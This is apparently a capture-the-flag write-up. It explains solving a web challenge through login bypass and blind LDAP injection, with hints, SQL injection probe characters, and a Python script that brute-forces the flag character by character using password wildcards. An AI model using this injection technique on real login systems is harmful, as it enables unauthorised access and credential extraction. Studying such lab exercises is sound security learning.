## Skills involved: Blind testing

I wasn't familiar with the technology at all. Most hints on the forum were cryptic but there are helpful ones.

<details>
  <summary> Hint 1: </summary>
  
  You can skip the login without any knowledge, you can also try poking the login to gain more information.
</details>
<details>
  <summary> Hint 2: </summary>
  
  The content you can access after bypassing the login can help a lot. Make sure you look at all files that may be important.
</details>
<details>
  <summary> <b>Solution:</b> </summary>
  <br/>
  
  My first idea was to try for SQL injection. I tried common SQL injection payloads like `'` `"` `)` `;--` `#`  hoping to either cause an error or bypass auth.
  
  Only `)` gave 500. I knew that it was an injection vulnerability but that is not enough information.
  
  I also 'bypassed' login by accessing `/9643.../` directory, which gave me a search page. The search was not useful as I can only get 403, but the javascript revealed information on the data format to be received: `{cn: any, sn: any, mail: any, homePhone: any}[]`.
  
  Some googling revealed that they are [LDAP attributes](https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html). I have heard of LDAP due to the [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) vulnerability but I had no idea what LDAP was - I didn't even know Java.
  
  Eventually I learnt about [LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection). With reference to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection), here's a short Python script I wrote to recover the flag.
  
``` py
import requests, string
domain = "***"
flag = ""
letters = string.digits+string.ascii_letters+"_}!"
not_done = True
while not_done:
  not_done = False
  for c in letters:
    r = requests.post(f"http://{domain}/login", data={'username': 'reese', 'password': flag+c+"*"})
    if 'Set-Cookie' in r.history[0].headers:
      not_done = True
      flag += c
      print(flag)
      break
print(flag)
```
</details>
